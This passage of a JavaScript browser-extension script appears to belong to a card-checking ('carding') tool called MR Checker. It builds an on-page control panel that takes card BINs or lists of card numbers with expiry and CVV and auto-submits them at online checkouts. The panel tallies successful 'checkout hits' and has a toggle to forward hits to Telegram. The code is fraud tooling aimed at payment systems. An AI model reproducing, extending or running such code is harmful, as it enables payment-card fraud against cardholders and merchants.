        savedId = localStorage.getItem(K.USER_ID) || ""
        userId = localStorage.getItem(K.USER_ID) || ""
        userFirstName = localStorage.getItem(K.FIRST_NAME) || ""
        savedToken = localStorage.getItem(K.TOKEN) || ""
        resolve();
      }
    });

    // Wait for all three to finish simultaneously
    const [hitStatus, isValidLicense] = await Promise.all([hitCheckPromise, licensePromise, dataLoadPromise]);

    if (hitStatus) {
      hasHit = true
      hasNotified = true
      isCreatingOverlay = false
      return
    }
    if (document.querySelector(".card-generator-overlay")) {
      isCreatingOverlay = false
      return
    }

    // ============= CHECK LICENSE RESULT =============
    if (!isValidLicense) {
      showInvalidLicensePage();
      isCreatingOverlay = false;
      return;
    }

    if (isVersionOutdated) {
      showUpdatePage("outdated");
      isCreatingOverlay = false;
      return;
    }

    // Also check localStorage if no token in synced storage
    if (!savedToken) {
      savedToken = localStorage.getItem(K.TOKEN) || "";
    }

    // ============= STEP 3: PREP USER STATE (TOKEN OPTIONAL) =============
    // Bypass login gate on first open: always show dashboard by default.
    isLoggedIn = true;

    if (savedToken && savedToken.length === 15) {
      const restoreResult = await validateToken(savedToken);
      const isTokenValid = restoreResult && restoreResult.success;

      if (isTokenValid) {
        isLoggedIn = true;
        userId = restoreResult.userId || userId;
        userFirstName = restoreResult.firstName || userFirstName;
        userPfpUrl = restoreResult.pfpUrl || userPfpUrl || DEFAULT_PFP;
        userHitsCount = restoreResult.userHits ?? restoreResult.hits ?? 0;
        globalHitsCount = restoreResult.globalHits ?? globalHitsCount;
        userAttemptsCount = restoreResult.attempts || 0;
        savedId = userId;
        // Also refresh from hit_counts.json as a safety net
        await Promise.race([fetchHitCounts(), new Promise(r => setTimeout(r, 2000))]);
        startHitCountsRefresh();

        window.postMessage({
          type: "SAVE_LOGIN_STATE",
          token: savedToken,
          userId: userId,
          firstName: userFirstName,
        }, "*");
      } else {
        // Clear invalid token but keep dashboard accessible without login
        userId = "";
        userFirstName = "";
        savedToken = "";

        localStorage.removeItem(K.TOKEN);
        localStorage.removeItem(K.USER_ID);
        localStorage.removeItem(K.FIRST_NAME);

        if (window.LynixStorage && window.LynixStorage.clearUserSession) {
          window.LynixStorage.clearUserSession();
        }

        window.postMessage({ type: "SAVE_LOGIN_STATE", token: null }, "*");
      }
    }

    // ============= STEP 4: CREATE OVERLAY WITH CORRECT STATE =============

    if (tgForwardEnabled === undefined) {
      tgForwardEnabled = localStorage.getItem(K.TOGGLE_TG_FORWARD) !== "false"
    }
    cardFieldsDetected = hasCardFields()
    // ============= NEW OVERLAY: Status Card + Notification Stack =============
    const overlay = document.createElement("div")
    overlay.className = "lx-status-card"
    overlay.id = "lxStatusCard"
    overlay.innerHTML = `
    <div class="lx-card-inner" id="lxCardInner">
      <div class="lx-card-header">
        <span class="lx-brand"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#f97316" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px;margin-right:4px"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"/><path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"/><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"/></svg>MR Checker</span>
        <button class="lx-toggle-btn" id="lxToggleBtn" title="Minimize">
          <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 4L6 8L10 4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
      </div>
      <div class="lx-stats">
        <div class="lx-stat">
          <span class="lx-stat-val" id="lxSiteAttempts">${attemptCount}</span>
          <span class="lx-stat-lbl">Attempts</span>
        </div>
        <div class="lx-stat-divider"></div>
        <div class="lx-stat">
          <span class="lx-stat-val" id="lxCheckoutHits">${cardHistory.filter(h => h.response === "SUCCESS").length}</span>
          <span class="lx-stat-lbl">Checkout Hits</span>
        </div>
        <div class="lx-stat-divider"></div>
        <div class="lx-stat">
          <span class="lx-stat-val" id="lxTotalHits">${userHitsCount}</span>
          <span class="lx-stat-lbl">Total Hits</span>
        </div>
      </div>
    </div>
    <div class="lx-pill hidden" id="lxPill"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#f97316" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"/><path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"/><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"/></svg></div>
  `
    // Create right-side notification stack
    let lxNotifStack = document.getElementById("lxNotifStack")
    if (!lxNotifStack) {
      lxNotifStack = document.createElement("div")
      lxNotifStack.className = "lx-notif-stack"
      lxNotifStack.id = "lxNotifStack"
      document.body.appendChild(lxNotifStack)
    }
    const ccModal = document.createElement("div")
    ccModal.className = "cc-modal hidden"
    ccModal.id = "ccModal"
    ccModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>${LX.edit} CC List (Max 20)</span>
        <button class="cc-modal-close" id="closeCcModal">✕</button>
      </div>
      <div class="cc-modal-body">
        <textarea id="ccTextarea" placeholder="Enter cards (one per line)&#10;Format: cc|mm|yy|cvv&#10;&#10;Example:&#10;4532110012345678|09|27|123&#10;4532110087654321|12|28|456"></textarea>
        <div class="cc-modal-info">
          <span id="ccCount">0</span>/20 cards
        </div>
      </div>
      <div class="cc-modal-footer">
        <button class="action-btn" id="clearCcList">Clear</button>
        <button class="action-btn primary-btn" id="saveCcList">${LX.save} Save</button>
      </div>
    </div>
  `

    const bgInfoModal = document.createElement("div")
    bgInfoModal.className = "cc-modal hidden"
    bgInfoModal.id = "bgInfoModal"
    bgInfoModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>${LX.phone} BG Color Info</span>
        <button class="cc-modal-close" id="closeBgInfoModal">✕</button>
      </div>
      <div class="cc-modal-body bg-info-body">
        <div class="bg-info-icon">
          <span>${LX.warn}</span>
        </div>
        <div class="bg-info-title">
          Background Color Only Works On Mobile Phone
        </div>
        <div class="bg-info-content">
          <div class="bg-info-box bg-info-warning">
            <div class="bg-info-box-title warning-text">${LX.x} Not Working On:</div>
            <div>• Desktop / PC Browser</div>
            <div>• Laptop Browser</div>
          </div>
          <div class="bg-info-box bg-info-success">
            <div class="bg-info-box-title success-text">${LX.phone} For Phone Users:</div>
            <div>• Don't use Desktop Mode in browser</div>
            <div>• Use Mobile View for best results</div>
          </div>
        </div>
      </div>
      <div class="cc-modal-footer">
        <button class="action-btn primary-btn full-width-btn" id="bgInfoOkBtn">Okyy.!</button>
      </div>
    </div>
  `

    const binLibraryModal = document.createElement("div")
    binLibraryModal.className = "cc-modal hidden"
    binLibraryModal.id = "binLibraryModal"
    binLibraryModal.innerHTML = `
    <div class="cc-modal-content bin-library-modal">
      <div class="cc-modal-header">
        <div class="bin-library-header-top">
          <span class="bin-lib-title">${LX.book} BIN Library</span>
          <button class="cc-modal-close" id="closeBinLibraryModal">✕</button>
        </div>
        <div class="bin-library-filter">
          <button class="bin-filter-btn active" id="binFilterAll">All</button>
          <button class="bin-filter-btn" id="binFilterTop">Top</button>
        </div>
      </div>
      <div class="cc-modal-body" id="binLibraryBody">
        <div class="bin-library-grid" id="binLibraryGrid">
          <!-- BIN cards will be inserted here -->
        </div>
      </div>
    </div>
  `

    document.body.appendChild(bgInfoModal)
    document.body.appendChild(binLibraryModal)
    document.body.appendChild(ccModal)
    document.body.appendChild(overlay)

    // ============= TOP-LEFT CONTROL PANEL =============
    let lxCtrl = document.getElementById("lxCtrlPanel")
    if (!lxCtrl) {
      lxCtrl = document.createElement("div")
      lxCtrl.id = "lxCtrlPanel"
      lxCtrl.className = "lx-ctrl"
      const currentBin = getSavedBIN()
      const binLabel = currentBin ? currentBin.substring(0, 8) + "…" : "No BIN"
      lxCtrl.innerHTML = `
        <div class="lx-ctrl-header" id="lxCtrlHeader">
          <div class="lx-ctrl-status">
            <div class="lx-ctrl-dot" id="lxCtrlDot"></div>
            <span class="lx-ctrl-label" id="lxCtrlLabel">Idle</span>
          </div>
          <div class="lx-ctrl-bin" id="lxCtrlBin">${binLabel}</div>
          <button class="lx-ctrl-min-btn" id="lxCtrlMinBtn" title="Minimize">
            <svg width="10" height="10" viewBox="0 0 10 2" fill="none"><rect width="10" height="2" rx="1" fill="currentColor"/></svg>
          </button>
        </div>
        <div class="lx-ctrl-body" id="lxCtrlBody">
          <button class="lx-ctrl-btn" id="lxCtrlBtn">
            <svg class="lx-ctrl-play" id="lxCtrlPlay" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="5,3 19,12 5,21"/></svg>
            <svg class="lx-ctrl-stop hidden" id="lxCtrlStop" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><rect x="4" y="4" width="16" height="16" rx="2"/></svg>
            <span id="lxCtrlBtnText">Start</span>
          </button>
          <div class="lx-ctrl-row lx-ctrl-switch-row" id="lxCtrlSwitchRow">
            <div class="lx-ctrl-opt-label">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2v6h-6"/><path d="M3 12a9 9 0 0 1 15-6.7L21 8"/><path d="M3 22v-6h6"/><path d="M21 12a9 9 0 0 1-15 6.7L3 16"/></svg>
              <span>BIN</span>
              <span class="lx-ctrl-switch-counter" id="lxCtrlSwitchCounter">${savedBINs.length > 0 ? (currentBinIndex + 1) + '/' + savedBINs.length : '0/0'}</span>
            </div>
            <button class="lx-ctrl-switch-btn" id="lxCtrlSwitchBtn" ${savedBINs.length <= 1 ? 'disabled' : ''}>Switch</button>
          </div>
          <div class="lx-ctrl-row lx-ctrl-option">
            <div class="lx-ctrl-opt-label">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
              <span>Blur</span>
            </div>
            <label class="lx-ctrl-toggle">
              <input type="checkbox" id="lxBlurToggle">
              <span class="lx-ctrl-track"></span>
            </label>
          </div>
        </div>
      `
      document.body.appendChild(lxCtrl)

      // Load blur state via storage bridge (page context safe)
      LynixStorage.get('lynix_privacy_blur').then((d) => {
        const blurToggle = document.getElementById("lxBlurToggle")
        if (blurToggle && d && d.lynix_privacy_blur) {
          blurToggle.checked = true
          applyPrivacyBlur()
        }
      })

      // Wire blur toggle
      const blurToggle = document.getElementById("lxBlurToggle")
      if (blurToggle) {
        blurToggle.addEventListener("change", () => {
          if (blurToggle.checked) {
            applyPrivacyBlur()
          } else {
            removePrivacyBlur()
          }
          LynixStorage.set({ lynix_privacy_blur: blurToggle.checked })
        })
      }

      const ctrlBtn = document.getElementById("lxCtrlBtn")
      if (ctrlBtn) {
        ctrlBtn.addEventListener("click", () => {
          if (isAutoSubmitting) {
            stopAutoSubmit()
            updateCtrlState(false)
          } else {
            startAutoSubmit()
            updateCtrlState(true)
          }
        })
      }

      // Wire minimize button
      const ctrlMinBtn = document.getElementById("lxCtrlMinBtn")
      if (ctrlMinBtn) {
        ctrlMinBtn.addEventListener("click", (e) => {
          e.stopPropagation()
          toggleCtrlPanel()
        })
      }

      // Wire header click to expand when minimized
      const ctrlHeader = document.getElementById("lxCtrlHeader")
      if (ctrlHeader) {
        ctrlHeader.addEventListener("click", () => {
          const ctrl = document.getElementById("lxCtrlPanel")
          if (ctrl && ctrl.classList.contains("lx-ctrl-minimized")) {
            toggleCtrlPanel()
          }
        })
      }

      // Wire BIN switch button on control panel
      const ctrlSwitchBtn = document.getElementById("lxCtrlSwitchBtn")
      if (ctrlSwitchBtn) {
        ctrlSwitchBtn.addEventListener("click", () => {
          switchBin()
          updateCtrlBinLabel()
        })
      }
    }

    function toggleCtrlPanel() {
      const ctrl = document.getElementById("lxCtrlPanel")
      if (!ctrl) return
      ctrl.classList.toggle("lx-ctrl-minimized")
    }

    function updateCtrlBinLabel() {
      const binEl = document.getElementById("lxCtrlBin")
      const counterEl = document.getElementById("lxCtrlSwitchCounter")
      const switchBtn = document.getElementById("lxCtrlSwitchBtn")
      const currentBin = getSavedBIN()
      if (binEl) binEl.textContent = currentBin ? currentBin.substring(0, 8) + "…" : "No BIN"
      if (counterEl) counterEl.textContent = savedBINs.length > 0 ? (currentBinIndex + 1) + '/' + savedBINs.length : '0/0'
      if (switchBtn) switchBtn.disabled = savedBINs.length <= 1
    }

    function updateCtrlState(running) {
      const dot = document.getElementById("lxCtrlDot")
      const label = document.getElementById("lxCtrlLabel")
      const btnText = document.getElementById("lxCtrlBtnText")
      const playIcon = document.getElementById("lxCtrlPlay")
      const stopIcon = document.getElementById("lxCtrlStop")
      const btn = document.getElementById("lxCtrlBtn")
      if (dot) dot.className = running ? "lx-ctrl-dot active" : "lx-ctrl-dot"
      if (label) label.textContent = running ? "Running" : "Idle"
      if (btnText) btnText.textContent = running ? "Stop" : "Start"
      if (playIcon) playIcon.classList.toggle("hidden", running)
      if (stopIcon) stopIcon.classList.toggle("hidden", !running)
      if (btn) btn.classList.toggle("active", running)
      updateCtrlBinLabel()
    }

    // Expose updateCtrlState globally so autoStopOnError can call it
    window._lxUpdateCtrl = updateCtrlState

    // Wire minimize/maximize toggle
    const lxToggleBtn = document.getElementById("lxToggleBtn")
    const lxPill = document.getElementById("lxPill")
    if (lxToggleBtn) {
      lxToggleBtn.addEventListener("click", (e) => {
        e.stopPropagation()
        toggleMinimize(e)
      })
    }
    if (lxPill) {
      lxPill.addEventListener("click", (e) => {
        e.stopPropagation()
        toggleMinimize(e)
      })
    }

    setupEventListeners(overlay)
    window.postMessage({ type: "GET_TOGGLE_STATES" }, "*")
    window.postMessage({ type: "GET_SAVED_BIN" }, "*")
    window.postMessage({ type: "GET_SAVED_ID" }, "*")
    window.postMessage({ type: "GET_LOGIN_STATE" }, "*")
    isCreatingOverlay = false
  }
  function setupEventListeners(overlay) {
    const enterBinBtn = document.getElementById("enterBinBtn")
    const autocoBtn = document.getElementById("autocoBtn")
    const minimizeBtn = document.getElementById("minimizeBtn")
    const addBinBtn = document.getElementById("addBinBtn")
    const switchBinBtn = document.getElementById("switchBinBtn")
    loadSavedBins()
    if (addBinBtn) {
      addBinBtn.addEventListener("click", () => {
        const container = document.getElementById("binInputsContainer")
        const existingInputs = container.querySelectorAll(".bin-input")
        if (existingInputs.length >= 7) {
          showWarning("Maximum 7 BINs allowed", "error")
          return
        }
        const newRow = document.createElement("div")
        newRow.className = "bin-input-row"
        newRow.innerHTML = `
        <input type="text" class="input-field bin-input" placeholder="input bin" maxlength="30">
        <button class="remove-bin-btn" title="Remove">−</button>
      `
        container.appendChild(newRow)
        newRow.querySelector(".remove-bin-btn").addEventListener("click", () => {
          newRow.remove()
          // Persist remaining BINs
          const inputs = document.querySelectorAll(".bin-input")
          const remaining = Array.from(inputs).map(i => i.value.trim()).filter(b => b && b.length >= 6)
          if (remaining.length > 0) {
            saveBINs(remaining)
            currentBinIndex = Math.min(currentBinIndex, savedBINs.length - 1)
            updateBinStatus()
          }
          updateSwitchBtnVisibility()
        })
        updateSwitchBtnVisibility()
      })
    }
    if (switchBinBtn) {
      switchBinBtn.addEventListener("click", switchBin)
    }
    if (enterBinBtn) {
      enterBinBtn.addEventListener("click", () => {
        const inputs = document.querySelectorAll(".bin-input")
        const bins = []
        let hasError = false
        inputs.forEach((input) => {
          const bin = input.value.trim()
          if (bin) {

            const cardPart = bin.split("|")[0].replace(/[^0-9xX]/g, "")
            if (cardPart.length < 6) {
              showWarning("BIN must be at least 6 digits", "error")
              hasError = true
              return
            }
            if (cardPart.length > 30) {
              showWarning("Card number cannot be longer than 30 digits", "error")
              hasError = true
              return
            }
            bins.push(bin)
          }
        })
        if (hasError) return
        if (bins.length === 0) {
          showWarning("Please enter at least one BIN", "error")
          return
        }
        saveBINs(bins)
        currentBinIndex = 0
        updateBinStatus()
        updateSwitchBtnVisibility()
        showWarning(`${bins.length} BIN${bins.length > 1 ? "s" : ""} saved!`, "success")
      })
    }
    if (autocoBtn) {
      autocoBtn.addEventListener("click", () => {
        if (currentMode === "bin") {
          const bin = getSavedBIN()
          if (!bin) {
            showWarning("Please enter BIN first.", "error")
            return
          }
        } else {
          if (ccList.length === 0) {
            showWarning("Please add CCs first.", "error")
            return
          }
          currentCCIndex = 0
        }
        if (isAutoSubmitting) {
          stopAutoSubmit()
        } else {
          startAutoSubmit()
        }
      })
    }
    if (minimizeBtn) {
      minimizeBtn.addEventListener("click", (e) => {
        e.stopPropagation()
        toggleMinimize()
      })
    }

    const panelHeader = overlay.querySelector(".panel-header")
    if (panelHeader) {
      panelHeader.addEventListener("click", (e) => {
        e.stopPropagation()
      })
    }

    const modeBin = document.getElementById("modeBin")
    const modeCc = document.getElementById("modeCc")
    if (modeBin) {
      modeBin.addEventListener("click", () => setMode("bin"))
    }
    if (modeCc) {
      modeCc.addEventListener("click", () => setMode("cc"))
    }
    const openCcModal = document.getElementById("openCcModal")
    const closeCcModal = document.getElementById("closeCcModal")
    const saveCcList = document.getElementById("saveCcList")
    const clearCcList = document.getElementById("clearCcList")
    const ccTextarea = document.getElementById("ccTextarea")
    if (openCcModal) {
      openCcModal.addEventListener("click", () => {

        autoMinimizeForModal()

        const modal = document.getElementById("ccModal")
        modal.classList.remove("hidden")
        modal.offsetHeight
        modal.classList.add("show")
        if (ccTextarea && ccList.length > 0) {
          ccTextarea.value = ccList.join("\n")
        }
        updateCcCount()
      })
    }
    if (closeCcModal) {
      closeCcModal.addEventListener("click", () => {
        const modal = document.getElementById("ccModal")
        modal.classList.remove("show")
        setTimeout(() => {
          modal.classList.add("hidden")

          autoRestoreAfterModal()
        }, 400)
      })
    }
    if (ccTextarea) {
      ccTextarea.addEventListener("input", updateCcCount)
    }
    if (saveCcList) {
      saveCcList.addEventListener("click", saveCcListFunc)
    }
    if (clearCcList) {
      clearCcList.addEventListener("click", () => {
        if (ccTextarea) ccTextarea.value = ""
        updateCcCount()
      })
    }
    document.querySelectorAll(".collapsible-header").forEach((header) => {
      header.addEventListener("click", function (e) {
        e.preventDefault()
        e.stopPropagation()
        const contentId = this.id.replace("Toggle", "Content")
        const content = document.getElementById(contentId)
        const icon = this.querySelector(".collapse-icon")
        if (content && icon) {
          const isOpen = content.classList.contains("open")
          document.querySelectorAll(".collapsible-content.open").forEach((openContent) => {
            if (openContent !== content) {
              openContent.classList.remove("open")
              const otherHeader = openContent.previousElementSibling
              if (otherHeader) {
                otherHeader.classList.remove("active")
                const otherIcon = otherHeader.querySelector(".collapse-icon")
                if (otherIcon) otherIcon.classList.remove("icon-rotated")
              }
            }
          })
          if (isOpen) {
            content.classList.remove("open")
            this.classList.remove("active")
            icon.classList.remove("icon-rotated")
          } else {
            content.classList.add("open")
            this.classList.add("active")
            icon.classList.add("icon-rotated")
          }
        }
      })
    })
    const tgForwardToggle = document.getElementById("tgForwardToggle")
    const customNameInput = document.getElementById("customNameInput")
    const musicToggleBtn = document.getElementById("musicToggleBtn")
    if (tgForwardToggle) {
      tgForwardToggle.addEventListener("change", function () {
        tgForwardEnabled = this.checked
        localStorage.setItem(K.TOGGLE_TG_FORWARD, tgForwardEnabled)
      })
    }
    if (customNameInput) {
      customNameInput.addEventListener("input", function () {
        saveCustomName(this.value.trim())
      })
    }
    const customEmailInput = document.getElementById("customEmailInput")
    if (customEmailInput) {
      customEmailInput.addEventListener("input", function () {
        saveCustomEmail(this.value.trim())
      })
    }

    function isValidHexColor(hex) {
      return /^#[0-9A-Fa-f]{6}$/.test(hex)
    }

    function updateBgColor(color) {
      if (!isValidHexColor(color)) return
      pageBackgroundColor = color
      hasCustomColor = true
      _bgProcessed = new WeakSet()
      _lastAppliedBgColor = null
      saveBgColorSetting(bgColorEnabled, color, true)
      const colorInput = document.getElementById("pageBgColorInput")
      if (colorInput) colorInput.value = color
      if (bgColorEnabled) {
        applyCustomStyles()
      }
    }

    function showBgInfoModal() {

      const overlay = document.querySelector(".card-generator-overlay")
      if (overlay && !isMinimized) {
        isMinimized = true
        overlay.classList.add("minimized")
        const minimizeBtn = document.getElementById("minimizeBtn")
        if (minimizeBtn) {
          minimizeBtn.innerHTML = "✦"
          minimizeBtn.title = "Open panel"
        }
      }

      const modal = document.getElementById("bgInfoModal")
      if (modal) {
        modal.classList.remove("hidden")
        modal.classList.add("show")
      }
    }

    function setupBgColorHandlers() {

      const bgColorToggle = document.getElementById("bgColorToggle")
      if (bgColorToggle) {
        bgColorToggle.addEventListener("change", function () {
          bgColorEnabled = this.checked
          _bgProcessed = new WeakSet()
          _lastAppliedBgColor = null
          saveBgColorSetting(bgColorEnabled, pageBackgroundColor, hasCustomColor)

          const colorSettingsBox = document.getElementById("colorSettingsBox")
          if (colorSettingsBox) {
            colorSettingsBox.classList.toggle("hidden", !bgColorEnabled)
          }
          if (bgColorEnabled) {

            showBgInfoModal()

            if (!hasCustomColor) {
              sessionRandomColor = getRandomBgColor();
            }
            applyCustomStyles()
          } else {

            document.documentElement.style.removeProperty('background')
            document.documentElement.style.removeProperty('background-color')
            document.body.style.removeProperty('background')
            document.body.style.removeProperty('background-color')
            location.reload()
          }
        })
      }

      const pageBgColorInput = document.getElementById("pageBgColorInput")
      if (pageBgColorInput) {
        pageBgColorInput.addEventListener("input", function () {
          updateBgColor(this.value)
        })
      }

      const customMusicBtn = document.getElementById("customMusicBtn")
      const musicFileInput = document.getElementById("musicFileInput")
      const customMusicInfo = document.getElementById("customMusicInfo")
      const musicFilename = document.getElementById("musicFilename")
      const removeMusicBtn = document.getElementById("removeMusicBtn")
      const previewMusicBtn = document.getElementById("previewMusicBtn")

      let previewAudio = null
      let isPreviewPlaying = false

      // One-time cleanup: remove old base64 audio data from localStorage (now in chrome.storage)
      try { localStorage.removeItem(K.MUSIC_DATA) } catch (e) { }

      const savedMusicName = localStorage.getItem(K.MUSIC_NAME)
      if (savedMusicName && customMusicInfo && musicFilename) {
        customMusicInfo.classList.remove("hidden")
        musicFilename.textContent = savedMusicName
        if (customMusicBtn) customMusicBtn.textContent = "Change"
      }

      if (previewMusicBtn) {
        previewMusicBtn.addEventListener("click", () => {
          if (!localStorage.getItem(K.MUSIC_NAME)) {
            showWarning("No custom music to preview", "info")
            return
          }
          if (isPreviewPlaying) {
            window.postMessage({ type: "STOP_CUSTOM_PREVIEW" }, "*")
            isPreviewPlaying = false
            previewMusicBtn.innerHTML = LX.play + " Test"
            showWarning("Preview stopped", "info")
            return
          }
          window.postMessage({ type: "PLAY_CUSTOM_PREVIEW" }, "*")
          isPreviewPlaying = true
          previewMusicBtn.innerHTML = LX.stop + " Stop"
          showWarning("Playing...", "success")

          setTimeout(() => {
            if (isPreviewPlaying) {
              isPreviewPlaying = false
              previewMusicBtn.innerHTML = LX.play + " Test"
            }
          }, 30000)
        })
      }

      if (customMusicBtn && musicFileInput) {
        customMusicBtn.addEventListener("click", () => {
          if (previewAudio) {
            previewAudio.pause()
            previewAudio = null
            isPreviewPlaying = false
            if (previewMusicBtn) previewMusicBtn.innerHTML = LX.play
          }
          musicFileInput.click()
        })

        musicFileInput.addEventListener("change", function () {
          const file = this.files[0]
          if (!file) return

          if (!file.type.includes("audio/mpeg") && !file.name.endsWith(".mp3")) {
            showWarning("Only MP3 files allowed", "error")
            return
          }

          if (file.size > 5 * 1024 * 1024) {
            showWarning("File too large (max 5MB)", "error")
            return
          }

          const reader = new FileReader()
          reader.onload = function (e) {
            const base64 = e.target.result
            // Only store name in localStorage (tiny); audio data goes to chrome.storage via content script
            localStorage.setItem(K.MUSIC_NAME, file.name)
            window.postMessage({ type: "SAVE_CUSTOM_MUSIC", audioData: base64 }, "*")

            if (customMusicInfo) customMusicInfo.classList.remove("hidden")
            if (musicFilename) musicFilename.textContent = file.name
            if (customMusicBtn) customMusicBtn.textContent = "Change"

            showWarning("Custom music uploaded!", "success")
          }
          reader.readAsDataURL(file)
        })
      }

      if (removeMusicBtn) {
        removeMusicBtn.addEventListener("click", () => {
          if (previewAudio) {
            previewAudio.pause()
            previewAudio = null
            isPreviewPlaying = false
            if (previewMusicBtn) previewMusicBtn.innerHTML = LX.play
          }
          localStorage.removeItem(K.MUSIC_NAME)
          window.postMessage({ type: "REMOVE_CUSTOM_MUSIC" }, "*")
          if (customMusicInfo) customMusicInfo.classList.add("hidden")
          if (musicFilename) musicFilename.textContent = "No file"
          if (customMusicBtn) customMusicBtn.textContent = "Upload"
          showWarning("Custom music removed", "info")
        })
      }
    }

    function setupBinLibraryHandlers() {
      const binLibraryBtn = document.getElementById("binLibraryBtn")
      if (binLibraryBtn) {
        binLibraryBtn.addEventListener("click", async (e) => {
          e.preventDefault()
          e.stopPropagation()

          autoMinimizeForModal()

          const modal = document.getElementById("binLibraryModal")
          if (modal) {
            modal.classList.remove("hidden")
            modal.classList.add("show")
          }

          const grid = document.getElementById("binLibraryGrid")
          if (grid) {
            grid.innerHTML = '<div class="bin-library-empty">Loading BIN Library...</div>'
          }

          let success = await fetchBinLibrary()

          if (!success || binLibrary.length === 0) {
            await new Promise(r => setTimeout(r, 200))
            success = await fetchBinLibrary()
          }

          renderBinLibraryGrid()
        })
      }

      const closeBinLibraryModal = document.getElementById("closeBinLibraryModal")
      if (closeBinLibraryModal) {
        closeBinLibraryModal.addEventListener("click", () => {
          const modal = document.getElementById("binLibraryModal")
          if (modal) {
            modal.classList.remove("show")
            modal.classList.add("hidden")
          }

          autoRestoreAfterModal()
        })
      }
    }

    function setupMusicAndHistoryHandlers() {
      const musicToggleBtn = document.getElementById("musicToggleBtn")
      if (musicToggleBtn) {
        musicToggleBtn.addEventListener("click", (e) => {
          e.preventDefault()
          e.stopPropagation()
          toggleMusic()
        })
      }
      const clearHistory = document.getElementById("clearHistory")
      if (clearHistory) {
        clearHistory.addEventListener("click", () => {
          cardHistory = []
          localStorage.removeItem(K.LOGS)
          const clearedAt = new Date().toISOString()
          localStorage.setItem(K.LOGS_CLEARED_AT, clearedAt)
          saveToGlobalStorage(K.LOGS, [])
          saveToGlobalStorage(K.LOGS_CLEARED_AT, clearedAt)
          updateHistoryDisplay()
          showWarning("Logs cleared", "success")
        })
      }
    }

    setupBgColorHandlers()

    setupMusicAndHistoryHandlers()

    setupBinLibraryHandlers()

    const closeBgInfoModalBtn = document.getElementById("closeBgInfoModal")
    const bgInfoOkBtn = document.getElementById("bgInfoOkBtn")

    if (closeBgInfoModalBtn) {
      closeBgInfoModalBtn.addEventListener("click", function () {
        const modal = document.getElementById("bgInfoModal")
        if (modal) {
          modal.classList.remove("show")
          modal.classList.add("hidden")
        }

        autoRestoreAfterModal()
      })
    }
    if (bgInfoOkBtn) {
      bgInfoOkBtn.addEventListener("click", function () {
        const modal = document.getElementById("bgInfoModal")
        if (modal) {
          modal.classList.remove("show")
          modal.classList.add("hidden")
        }

        autoRestoreAfterModal()
      })
    }
  }

  function setupLoginListeners() {
    const loginBtn = document.getElementById("loginBtn")
    const tokenInput = document.getElementById("tokenInput")
    const logoutBtn = document.getElementById("logoutBtn")
    if (loginBtn) {
      loginBtn.addEventListener("click", handleLogin)
    }
    if (tokenInput) {
      tokenInput.addEventListener("keypress", (e) => {
        if (e.key === "Enter") handleLogin()
      })
    }
    if (logoutBtn) {
      logoutBtn.addEventListener("click", handleLogout)
    }
  }

  async function handleLogin() {
    const tokenInput = document.getElementById("tokenInput")
    const loginBtn = document.getElementById("loginBtn")
    if (!tokenInput) return
    const token = tokenInput.value.trim().toUpperCase()
    if (!token) {
      showLoginError("Enter your token")
      return
    }
    if (token.length !== 15) {
      showLoginError("Token must be 15 characters")
      return
    }
    loginBtn.disabled = true
    loginBtn.innerHTML = LX.loading + " Verifying..."
    try {
      const result = await validateToken(token)
      if (result.success) {
        userId = result.userId
        userFirstName = result.firstName || ""
        userPfpUrl = result.pfpUrl || DEFAULT_PFP
        userHitsCount = result.userHits ?? result.hits ?? 0
        globalHitsCount = result.globalHits ?? globalHitsCount
        userAttemptsCount = result.attempts || 0
        isLoggedIn = true
        updateIpBarUserInfo()
        startHitCountsRefresh()

        // Retry pfp load - bot may still be uploading to imgBB
        if (!userPfpUrl || userPfpUrl === DEFAULT_PFP) {
          const retryToken = token;
          const retryDelays = [3000, 6000, 12000];
          retryDelays.forEach(delay => {
            setTimeout(async () => {
              if (userPfpUrl && userPfpUrl !== DEFAULT_PFP) return;
              try {
                const fresh = await validateToken(retryToken);
                if (fresh.success && fresh.pfpUrl && fresh.pfpUrl !== DEFAULT_PFP) {
                  userPfpUrl = fresh.pfpUrl;
                  updateIpBarUserInfo();
                }
              } catch (e) { }
            }, delay);
          });
        }

        // Save to localStorage for backwards compatibility
        localStorage.setItem(K.TOKEN, token)
        localStorage.setItem(K.USER_ID, userId)
        localStorage.setItem(K.FIRST_NAME, userFirstName)
        savedId = userId

        // Save to synced chrome.storage via storage module
        if (window.LynixStorage && window.LynixStorage.saveUserSession) {
          window.LynixStorage.saveUserSession(token, userId, userFirstName);
        }

        window.postMessage({
